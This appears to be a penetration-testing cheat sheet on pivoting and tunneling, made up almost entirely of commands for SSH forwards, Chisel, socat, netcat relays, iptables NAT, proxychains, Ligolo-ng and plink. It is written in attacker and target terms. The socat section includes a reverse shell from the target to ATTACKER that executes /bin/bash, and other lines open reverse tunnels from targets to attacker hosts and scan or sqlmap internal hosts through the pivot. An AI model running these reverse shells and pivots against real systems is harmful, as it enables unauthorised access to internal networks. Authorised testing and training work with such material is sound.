# Port Forwarding & Tunneling

## SSH Tunneling

### Local Port Forward (access remote service through local port)

```bash
# Forward local:8080 → remote:80 through SSH
ssh -L 8080:TARGET_INTERNAL:80 user@PIVOT_HOST

# Access internal web server
curl http://127.0.0.1:8080

# Forward local:3306 → internal MySQL
ssh -L 3306:DB_SERVER:3306 user@PIVOT_HOST
mysql -h 127.0.0.1 -u root -p
```

### Remote Port Forward (expose local service to remote)

```bash
# Make attacker:9999 forward to target:22
ssh -R 9999:127.0.0.1:22 attacker@ATTACKER_IP

# On attacker machine:
ssh -p 9999 target_user@127.0.0.1
```

### Dynamic Port Forward (SOCKS proxy)

```bash
# Create SOCKS4/5 proxy on local:1080
ssh -D 1080 user@PIVOT_HOST

# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn INTERNAL_TARGET

# Use with curl
curl --socks5 127.0.0.1:1080 http://INTERNAL_TARGET

# Use with browser (Firefox)
# Settings → Network → Manual Proxy → SOCKS Host: 127.0.0.1, Port: 1080
```

### SSH Options for Stability

```bash
# Background + no shell + keep alive
ssh -f -N -L 8080:TARGET:80 user@PIVOT \
  -o ServerAliveInterval=60 \
  -o ServerAliveCountMax=3 \
  -o StrictHostKeyChecking=no

# Multiple forwards in one connection
ssh -L 8080:WEB:80 -L 3306:DB:3306 -L 5432:PG:5432 user@PIVOT

# Through multiple hops (ProxyJump)
ssh -J user1@HOP1,user2@HOP2 user3@TARGET

# Through multiple hops (older SSH)
ssh -o ProxyCommand="ssh -W %h:%p user1@HOP1" user2@TARGET
```

---

## Chisel (Go binary, no SSH needed)

```bash
# On attacker (server)
chisel server --reverse --port 8000

# On target (client) — reverse SOCKS proxy
chisel client ATTACKER:8000 R:1080:socks

# On target — forward specific port
chisel client ATTACKER:8000 R:9999:127.0.0.1:3306

# On attacker, use the proxy
proxychains nmap -sT -Pn INTERNAL_TARGET
```

## Socat

```bash
# Simple port forward
socat TCP-LISTEN:8080,fork TCP:TARGET:80

# Forward with TLS
socat TCP-LISTEN:8080,fork OPENSSL:TARGET:443,verify=0

# Reverse shell relay
# On attacker:
socat TCP-LISTEN:4444,reuseaddr,fork TCP-LISTEN:5555,reuseaddr
# On target:
socat TCP:ATTACKER:5555 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# UDP tunnel over TCP
# Server:
socat TCP-LISTEN:5000 UDP:TARGET:53
# Client:
socat UDP-LISTEN:53 TCP:SERVER:5000

# STDIO relay (proxy through intermediate)
socat TCP-LISTEN:1234,fork TCP:FINAL_TARGET:22
```

## Netcat Relay

```bash
# Simple relay with named pipe
mkfifo /tmp/relay
nc -lp 8080 < /tmp/relay | nc TARGET 80 > /tmp/relay

# Two-stage relay
# Listener:
nc -lp 4444 | nc -lp 5555

# Client connects to 4444, traffic relayed to whatever connects to 5555
```

## iptables Forwarding

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Forward port 80 to internal target
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination TARGET:80
iptables -t nat -A POSTROUTING -j MASQUERADE

# Forward all traffic from one interface to another
iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT
iptables -A FORWARD -i eth1 -o eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
```

## Proxychains Configuration

```bash
# /etc/proxychains4.conf
# strict_chain = fail if any proxy down
# dynamic_chain = skip dead proxies
# random_chain = random order

# Example config:
cat > /etc/proxychains4.conf << 'EOF'
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
# Add more proxies for chaining:
# socks4 127.0.0.1 1081
# http   127.0.0.1 8080
EOF

# Usage
proxychains nmap -sT -Pn -p 80,443,8080 INTERNAL_TARGET
proxychains curl http://INTERNAL_TARGET
proxychains ssh user@INTERNAL_TARGET
proxychains sqlmap -u "http://INTERNAL_TARGET/page?id=1"
```

## Ligolo-ng (advanced tunneling)

```bash
# On attacker (proxy server)
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# On target (agent)
ligolo-agent -connect ATTACKER:11601 -ignore-cert

# In ligolo-proxy interface:
> session      # select session
> ifconfig     # show target interfaces
> start        # start tunnel

# Add route on attacker
sudo ip route add 10.10.10.0/24 dev ligolo

# Now access internal network directly
nmap -sT 10.10.10.1-254
```

## plink (Windows SSH tunneling from Linux context)

```bash
# Upload plink.exe to Windows target, forward from Linux attacker
plink.exe -ssh -l user -pw password -R 9999:127.0.0.1:3389 ATTACKER_IP
```
